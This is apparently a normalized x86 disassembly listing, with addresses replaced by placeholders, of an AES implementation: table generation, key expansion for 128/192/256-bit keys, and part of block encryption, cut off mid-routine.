sub_401000
push ebp
mov ebp esp
sub esp 0x2c
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x10 ] 0x100
jae r-xdata
mov [ rw-data ] 0x0
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov dl [ ebp - 0x4 ]
mov [ ecx + rw-data ] dl
mov eax [ ebp - 0x4 ]
and eax 0xff
mov cl [ ebp - 0x10 ]
mov [ eax + rw-data ] cl
mov edx [ ebp - 0x4 ]
and edx 0xff
mov eax [ ebp - 0x4 ]
and eax 0xff
shl eax 0x1
xor edx eax
mov ecx [ ebp - 0x4 ]
and ecx 0xff
and ecx 0x80
neg ecx
sbb ecx ecx
and ecx 0x1b
xor edx ecx
mov [ ebp - 0x4 ] dl
jmp r-xdata
cmp [ ebp - 0x10 ] 0xa
jae r-xdata
mov eax [ ebp - 0x10 ]
add eax 0x1
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
mov eax [ ebp - 0x4 ]
and eax 0xff
mov ecx [ ebp - 0x10 ]
mov [ ecx * 4 + rw-data ] eax
mov edx [ ebp - 0x4 ]
and edx 0xff
shl edx 0x1
mov eax [ ebp - 0x4 ]
and eax 0xff
and eax 0x80
neg eax
sbb eax eax
and eax 0x1b
xor edx eax
mov [ ebp - 0x4 ] dl
jmp r-xdata
cmp [ ebp - 0x10 ] 0x100
jae r-xdata
mov edx [ ebp - 0x10 ]
add edx 0x1
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x10 ] 0x0
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x100
jae r-xdata
mov [ ebp - 0x14 ] 0x0
mov edx [ ebp - 0x10 ]
xor eax eax
mov al [ edx + rw-data ]
mov ecx 0xff
sub ecx eax
xor edx edx
mov dl [ ecx + rw-data ]
mov [ ebp - 0x14 ] edx
jmp r-xdata
mov [ rw-data ] 0x1
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x10 ]
mov al [ edx + rw-data ]
mov [ ebp - 0x4 ] al
mov ecx [ ebp - 0x4 ]
and ecx 0xff
mov [ ebp - 0xc ] ecx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov [ edx * 4 + rw-data ] eax
mov ecx [ ebp - 0xc ]
rol ecx 0x8
mov edx [ ebp - 0x10 ]
mov [ edx * 4 + rw-data ] ecx
mov eax [ ebp - 0xc ]
rol eax 0x10
mov ecx [ ebp - 0x10 ]
mov [ ecx * 4 + rw-data ] eax
mov edx [ ebp - 0xc ]
rol edx 0x18
mov eax [ ebp - 0x10 ]
mov [ eax * 4 + rw-data ] edx
mov ecx 0x2
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
mov al [ ebp - 0x14 ]
mov [ ebp - 0x4 ] al
mov cl [ ebp - 0x4 ]
mov [ ebp - 0x8 ] cl
mov edx [ ebp - 0x8 ]
and edx 0xff
sar edx 0x7
mov eax [ ebp - 0x8 ]
and eax 0xff
shl eax 0x1
or edx eax
mov [ ebp - 0x8 ] dl
mov cl [ ebp - 0x4 ]
xor cl [ ebp - 0x8 ]
mov [ ebp - 0x4 ] cl
mov edx [ ebp - 0x8 ]
and edx 0xff
sar edx 0x7
mov eax [ ebp - 0x8 ]
and eax 0xff
shl eax 0x1
or edx eax
mov [ ebp - 0x8 ] dl
mov cl [ ebp - 0x4 ]
xor cl [ ebp - 0x8 ]
mov [ ebp - 0x4 ] cl
mov edx [ ebp - 0x8 ]
and edx 0xff
sar edx 0x7
mov eax [ ebp - 0x8 ]
and eax 0xff
shl eax 0x1
or edx eax
mov [ ebp - 0x8 ] dl
mov cl [ ebp - 0x4 ]
xor cl [ ebp - 0x8 ]
mov [ ebp - 0x4 ] cl
mov edx [ ebp - 0x8 ]
and edx 0xff
sar edx 0x7
mov eax [ ebp - 0x8 ]
and eax 0xff
shl eax 0x1
or edx eax
mov [ ebp - 0x8 ] dl
mov ecx [ ebp - 0x8 ]
and ecx 0xff
xor ecx 0x63
mov dl [ ebp - 0x4 ]
xor dl cl
mov [ ebp - 0x4 ] dl
mov eax [ ebp - 0x10 ]
mov cl [ ebp - 0x4 ]
mov [ eax + rw-data ] cl
mov edx [ ebp - 0x4 ]
and edx 0xff
mov al [ ebp - 0x10 ]
mov [ edx + rw-data ] al
jmp r-xdata
mov [ ebp - 0x18 ] 0x0
mov edx [ ebp - 0x4 ]
and edx 0xff
test edx edx
je r-xdata
mov [ ebp - 0x1c ] 0x0
mov edx [ ebp - 0x4 ]
and edx 0xff
test edx edx
je r-xdata
xor eax eax
mov al [ rw-data ]
mov ecx [ ebp - 0x4 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + rw-data ]
add eax edx
cdq
mov ecx 0xff
idiv ecx
xor eax eax
mov al [ edx + rw-data ]
mov [ ebp - 0x18 ] eax
jmp r-xdata
mov [ ebp - 0x20 ] 0x0
mov ecx [ ebp - 0x4 ]
and ecx 0xff
test ecx ecx
je r-xdata
xor eax eax
mov al [ rw-data ]
mov ecx [ ebp - 0x4 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + rw-data ]
add eax edx
cdq
mov ecx 0xff
idiv ecx
xor eax eax
mov al [ edx + rw-data ]
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov ecx 0x3
test ecx ecx
je r-xdata
mov [ ebp - 0x24 ] 0x0
mov edx [ ebp - 0x4 ]
and edx 0xff
test edx edx
je r-xdata
xor edx edx
mov dl [ rw-data ]
mov eax edx
mov ecx [ ebp - 0x4 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + rw-data ]
add eax edx
cdq
mov ecx 0xff
idiv ecx
xor eax eax
mov al [ edx + rw-data ]
mov [ ebp - 0x20 ] eax
jmp r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0xff
shl ecx 0x8
mov edx [ ebp - 0x18 ]
or edx ecx
mov eax [ ebp - 0x4 ]
and eax 0xff
shl eax 0x10
or edx eax
mov ecx [ ebp - 0x1c ]
shl ecx 0x18
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov [ edx * 4 + rw-data ] eax
mov ecx [ ebp - 0xc ]
rol ecx 0x8
mov edx [ ebp - 0x10 ]
mov [ edx * 4 + rw-data ] ecx
mov eax [ ebp - 0xc ]
rol eax 0x10
mov ecx [ ebp - 0x10 ]
mov [ ecx * 4 + rw-data ] eax
mov edx [ ebp - 0xc ]
rol edx 0x18
mov eax [ ebp - 0x10 ]
mov [ eax * 4 + rw-data ] edx
mov ecx [ ebp - 0x10 ]
mov dl [ ecx + rw-data ]
mov [ ebp - 0x4 ] dl
mov eax [ ebp - 0x4 ]
and eax 0xff
mov [ ebp - 0xc ] eax
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
mov [ ecx * 4 + rw-data ] edx
mov eax [ ebp - 0xc ]
rol eax 0x8
mov ecx [ ebp - 0x10 ]
mov [ ecx * 4 + rw-data ] eax
mov edx [ ebp - 0xc ]
rol edx 0x10
mov eax [ ebp - 0x10 ]
mov [ eax * 4 + rw-data ] edx
mov ecx [ ebp - 0xc ]
rol ecx 0x18
mov edx [ ebp - 0x10 ]
mov [ edx * 4 + rw-data ] ecx
mov eax 0xe
test eax eax
je r-xdata
mov [ ebp - 0x28 ] 0x0
mov edx [ ebp - 0x4 ]
and edx 0xff
test edx edx
je r-xdata
xor eax eax
mov al [ rw-data ]
mov ecx [ ebp - 0x4 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + rw-data ]
add eax edx
cdq
mov ecx 0xff
idiv ecx
xor eax eax
mov al [ edx + rw-data ]
mov [ ebp - 0x24 ] eax
jmp r-xdata
mov ecx 0x9
test ecx ecx
je r-xdata
mov [ ebp - 0x2c ] 0x0
mov edx [ ebp - 0x4 ]
and edx 0xff
test edx edx
je r-xdata
xor eax eax
mov al [ rw-data ]
mov ecx [ ebp - 0x4 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + rw-data ]
add eax edx
cdq
mov ecx 0xff
idiv ecx
xor eax eax
mov al [ edx + rw-data ]
mov [ ebp - 0x28 ] eax
jmp r-xdata
mov ecx 0xd
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x10 ]
add ecx 0x1
mov [ ebp - 0x10 ] ecx
xor eax eax
mov al [ rw-data ]
mov ecx [ ebp - 0x4 ]
and ecx 0xff
xor edx edx
mov dl [ ecx + rw-data ]
add eax edx
cdq
mov ecx 0xff
idiv ecx
xor eax eax
mov al [ edx + rw-data ]
mov [ ebp - 0x2c ] eax
jmp r-xdata
mov ecx 0xb
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x24 ]
shl ecx 0x8
mov edx [ ebp - 0x20 ]
or edx ecx
mov eax [ ebp - 0x28 ]
shl eax 0x10
or edx eax
mov ecx [ ebp - 0x2c ]
shl ecx 0x18
or edx ecx
mov [ ebp - 0xc ] edx
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
mov [ edx * 4 + rw-data ] eax
mov ecx [ ebp - 0xc ]
rol ecx 0x8
mov edx [ ebp - 0x10 ]
mov [ edx * 4 + rw-data ] ecx
mov eax [ ebp - 0xc ]
rol eax 0x10
mov ecx [ ebp - 0x10 ]
mov [ ecx * 4 + rw-data ] eax
mov edx [ ebp - 0xc ]
rol edx 0x18
mov eax [ ebp - 0x10 ]
mov [ eax * 4 + rw-data ] edx
jmp r-xdata
sub_40155b
push ebp
mov ebp esp
sub esp 0x1c
mov [ ebp - 0x18 ] ecx
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
add eax 0x1f
shr eax 0x5
mov ecx [ ebp - 0x18 ]
mov [ ecx + 0x4 ] eax
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ edx + 0x8 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x4 ]
mov [ edx + 0xc ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ edx + 0x10 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0xc ]
mov [ edx + 0x14 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ edx + 0x4 ]
mov [ ebp - 0x1c ] eax
cmp [ ebp - 0x1c ] 0x4
je r-xdata
call sub_401000
mov ecx [ ebp - 0x18 ]
mov edx [ ecx + 0x14 ]
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
cmp [ ebp - 0x1c ] 0x6
je r-xdata
cmp [ ebp - 0x14 ] 0xa
jae r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov [ edx + 0x18 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x1c ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ edx + 0x1c ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
cmp [ ebp - 0x1c ] 0x8
je r-xdata
jmp r-xdata
mov ecx [ ebp - 0x4 ]
ror ecx 0x8
and ecx 0xff
mov edx [ ebp - 0x4 ]
ror edx 0x8
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
ror ecx 0x8
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
ror edx 0x8
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
xor eax [ ecx * 4 + rw-data ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x14 ]
shl edx 0x2
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
xor ecx [ eax + edx * 4 + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x2
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x18 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x2
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
xor ecx [ eax + edx * 4 + 0xc ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x2
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x1c ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x2
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
xor ecx [ eax + edx * 4 + 0x10 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x2
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x20 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x2
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
xor ecx [ eax + edx * 4 + 0x14 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x2
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x24 ] ecx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x8
jae r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x10 ]
mov [ eax + 0x18 ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x14 ]
mov [ eax + 0x1c ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x18 ]
mov [ eax + 0x20 ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x1c ]
mov [ eax + 0x24 ] edx
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x24 ]
mov [ ebp - 0x4 ] ecx
mov [ ebp - 0x14 ] 0x0
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x8 ]
mov [ edx + 0x108 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0xc ]
mov [ edx + 0x10c ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x10 ]
mov [ edx + 0x110 ] ecx
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x14 ]
mov [ edx + 0x114 ] ecx
mov [ ebp - 0x14 ] 0x4
jmp r-xdata
mov eax [ ebp - 0x14 ]
add eax 0x1
mov [ ebp - 0x14 ] eax
jmp r-xdata
mov edx [ ebp - 0x4 ]
ror edx 0x8
and edx 0xff
mov eax [ ebp - 0x4 ]
ror eax 0x8
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
ror edx 0x8
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
ror eax 0x8
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x14 ]
xor ecx [ edx * 4 + rw-data ]
mov [ ebp - 0x4 ] ecx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
xor edx [ ecx + eax * 4 + 0x8 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x20 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
xor edx [ ecx + eax * 4 + 0xc ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x24 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
xor edx [ ecx + eax * 4 + 0x10 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x28 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
xor edx [ ecx + eax * 4 + 0x14 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x2c ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
xor edx [ ecx + eax * 4 + 0x18 ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x30 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
xor edx [ ecx + eax * 4 + 0x1c ]
mov [ ebp - 0x4 ] edx
mov eax [ ebp - 0x14 ]
imul eax eax 0x6
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov [ ecx + eax * 4 + 0x34 ] edx
jmp r-xdata
cmp [ ebp - 0x14 ] 0x7
jae r-xdata
mov eax [ ebp - 0x18 ]
mov ecx [ eax + 0x4 ]
lea edx [ ecx * 4 + 0x18 ]
cmp [ ebp - 0x14 ] edx
jae r-xdata
mov ecx [ ebp - 0x14 ]
add ecx 0x1
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x4 ]
ror eax 0x8
and eax 0xff
mov ecx [ ebp - 0x4 ]
ror ecx 0x8
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
ror eax 0x8
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
ror ecx 0x8
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x14 ]
xor edx [ eax * 4 + rw-data ]
mov [ ebp - 0x4 ] edx
mov ecx [ ebp - 0x14 ]
shl ecx 0x3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
xor eax [ edx + ecx * 4 + 0x8 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x14 ]
shl ecx 0x3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x28 ] eax
mov ecx [ ebp - 0x14 ]
shl ecx 0x3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
xor eax [ edx + ecx * 4 + 0xc ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x14 ]
shl ecx 0x3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x2c ] eax
mov ecx [ ebp - 0x14 ]
shl ecx 0x3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
xor eax [ edx + ecx * 4 + 0x10 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x14 ]
shl ecx 0x3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x30 ] eax
mov ecx [ ebp - 0x14 ]
shl ecx 0x3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
xor eax [ edx + ecx * 4 + 0x14 ]
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x14 ]
shl ecx 0x3
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov [ edx + ecx * 4 + 0x34 ] eax
mov ecx [ ebp - 0x14 ]
shl ecx 0x3
mov edx [ ebp - 0x4 ]
and edx 0xff
mov eax [ ebp - 0x4 ]
shr eax 0x8
and eax 0xff
mov edx [ edx * 4 + rw-data ]
xor edx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
shr eax 0x18
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov eax [ ebp - 0x18 ]
mov ecx [ eax + ecx * 4 + 0x18 ]
xor ecx edx
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x3
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x38 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x3
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
xor ecx [ eax + edx * 4 + 0x1c ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x3
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x3c ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x3
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
xor ecx [ eax + edx * 4 + 0x20 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x3
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x40 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x3
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
xor ecx [ eax + edx * 4 + 0x24 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x14 ]
shl edx 0x3
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x4 ]
mov [ eax + edx * 4 + 0x44 ] ecx
jmp r-xdata
mov esp ebp
pop ebp
retn 0x8
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
mov edx [ ecx + eax * 4 + 0x8 ]
and edx 0x7f7f7f7f
shl edx 0x1
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + eax * 4 + 0x8 ]
and eax 0x80808080
shr eax 0x7
imul eax eax 0x1b
xor edx eax
mov [ ebp - 0x8 ] edx
mov ecx [ ebp - 0x8 ]
and ecx 0x7f7f7f7f
shl ecx 0x1
mov edx [ ebp - 0x8 ]
and edx 0x80808080
shr edx 0x7
imul edx edx 0x1b
xor ecx edx
mov [ ebp - 0xc ] ecx
mov eax [ ebp - 0xc ]
and eax 0x7f7f7f7f
shl eax 0x1
mov ecx [ ebp - 0xc ]
and ecx 0x80808080
shr ecx 0x7
imul ecx ecx 0x1b
xor eax ecx
mov [ ebp - 0x10 ] eax
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x10 ]
xor ecx [ eax + edx * 4 + 0x8 ]
mov [ ebp - 0x4 ] ecx
mov edx [ ebp - 0x8 ]
xor edx [ ebp - 0xc ]
xor edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
mov [ ecx + eax * 4 + 0x108 ] edx
mov edx [ ebp - 0x8 ]
xor edx [ ebp - 0x4 ]
ror edx 0x8
mov eax [ ebp - 0xc ]
xor eax [ ebp - 0x4 ]
ror eax 0x10
xor edx eax
mov ecx [ ebp - 0x4 ]
ror ecx 0x18
xor edx ecx
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x18 ]
mov eax [ ecx + eax * 4 + 0x108 ]
xor eax edx
mov ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x18 ]
mov [ edx + ecx * 4 + 0x108 ] eax
jmp r-xdata
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
mov edx [ ebp - 0x14 ]
add edx 0x1
mov [ ebp - 0x14 ] edx
sub_401bbb
push ebp
mov ebp esp
sub esp 0x28
mov [ ebp - 0x28 ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x28 ]
mov edx [ eax ]
xor edx [ ecx + 0x8 ]
mov [ ebp - 0x14 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x28 ]
mov edx [ eax + 0x4 ]
xor edx [ ecx + 0xc ]
mov [ ebp - 0x10 ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x28 ]
mov edx [ eax + 0x8 ]
xor edx [ ecx + 0x10 ]
mov [ ebp - 0xc ] edx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x28 ]
mov edx [ eax + 0xc ]
xor edx [ ecx + 0x14 ]
mov [ ebp - 0x8 ] edx
mov eax [ ebp - 0x28 ]
add eax 0x18
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x28 ]
cmp [ ecx + 0x4 ] 0x6
jbe r-xdata
mov eax [ ebp - 0x28 ]
cmp [ eax + 0x4 ] 0x4
jbe r-xdata
mov edx [ ebp - 0x14 ]
and edx 0xff
mov eax [ ebp - 0x10 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0xc ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx ]
mov [ ebp - 0x24 ] ecx
mov eax [ ebp - 0x10 ]
and eax 0xff
mov ecx [ ebp - 0xc ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x8 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x4 ]
mov [ ebp - 0x20 ] edx
mov ecx [ ebp - 0xc ]
and ecx 0xff
mov edx [ ebp - 0x8 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x14 ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx + 0x8 ]
mov [ ebp - 0x1c ] eax
mov edx [ ebp - 0x8 ]
and edx 0xff
mov eax [ ebp - 0x14 ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x10 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0xc ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0xc ]
mov [ ebp - 0x18 ] ecx
mov eax [ ebp - 0x4 ]
add eax 0x10
mov [ ebp - 0x4 ] eax
mov ecx [ ebp - 0x24 ]
and ecx 0xff
mov edx [ ebp - 0x20 ]
shr edx 0x8
and edx 0xff
mov eax [ ecx * 4 + rw-data ]
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x1c ]
shr ecx 0x10
and ecx 0xff
xor eax [ ecx * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
shr edx 0x18
and edx 0xff
xor eax [ edx * 4 + rw-data ]
mov ecx [ ebp - 0x4 ]
xor eax [ ecx ]
mov [ ebp - 0x14 ] eax
mov edx [ ebp - 0x20 ]
and edx 0xff
mov eax [ ebp - 0x1c ]
shr eax 0x8
and eax 0xff
mov ecx [ edx * 4 + rw-data ]
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x18 ]
shr edx 0x10
and edx 0xff
xor ecx [ edx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x18
and eax 0xff
xor ecx [ eax * 4 + rw-data ]
mov edx [ ebp - 0x4 ]
xor ecx [ edx + 0x4 ]
mov [ ebp - 0x10 ] ecx
mov eax [ ebp - 0x1c ]
and eax 0xff
mov ecx [ ebp - 0x18 ]
shr ecx 0x8
and ecx 0xff
mov edx [ eax * 4 + rw-data ]
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x24 ]
shr eax 0x10
and eax 0xff
xor edx [ eax * 4 + rw-data ]
mov ecx [ ebp - 0x20 ]
shr ecx 0x18
and ecx 0xff
xor edx [ ecx * 4 + rw-data ]
mov eax [ ebp - 0x4 ]
xor edx [ eax + 0x8 ]
mov [ ebp - 0xc ] edx
mov ecx [ ebp - 0x18 ]
and ecx 0xff
